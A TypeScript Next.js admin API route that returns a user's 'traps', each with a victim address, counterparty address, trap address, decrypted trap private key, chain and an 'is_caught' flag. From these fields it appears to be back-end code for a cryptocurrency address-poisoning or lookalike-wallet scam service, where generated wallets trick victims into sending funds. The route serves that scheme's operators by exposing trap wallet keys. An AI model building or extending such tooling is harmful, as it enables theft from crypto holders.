import { NextRequest, NextResponse } from 'next/server';
import { getAuthUser } from '@/lib/auth';
import { supabaseService } from '@/lib/supabaseService';
import { decrypt } from '@/lib/encryption';

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ userId: string }> }
) {
  const { userId } = await params;

  try {
    const admin = await getAuthUser();
    if (!admin) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const { data: adminUser } = await supabaseService
      .from('users')
      .select('role')
      .eq('id', admin.id)
      .single();
    if (adminUser?.role !== 'admin') {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }

    // Fetch traps for this user (via campaigns)
    const { data: traps, error } = await supabaseService
      .from('traps')
      .select(`
        id,
        victim_address,
        counterparty_address,
        trap_address,
        trap_private_key_enc,
        is_caught,
        created_at,
        campaign_id,
        campaigns:campaign_id ( id, chain )
      `)
      .eq('campaigns.user_id', userId)
      .order('created_at', { ascending: false });

    if (error) {
      console.error('[admin/users/traps] Fetch error:', error);
      return NextResponse.json({ error: error.message }, { status: 500 });
    }

    // Decrypt private keys
    const trapsWithKeys = traps.map((trap: any) => {
      let decryptedKey = null;
      try {
        if (trap.trap_private_key_enc) {
          decryptedKey = decrypt(trap.trap_private_key_enc);
        }
      } catch (e) {
        decryptedKey = 'Error decrypting';
      }
      return {
        ...trap,
        private_key: decryptedKey,
        trap_private_key_enc: undefined,
      };
    });

    return NextResponse.json(trapsWithKeys);
  } catch (err) {
    console.error('[admin/users/traps] Error:', err);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}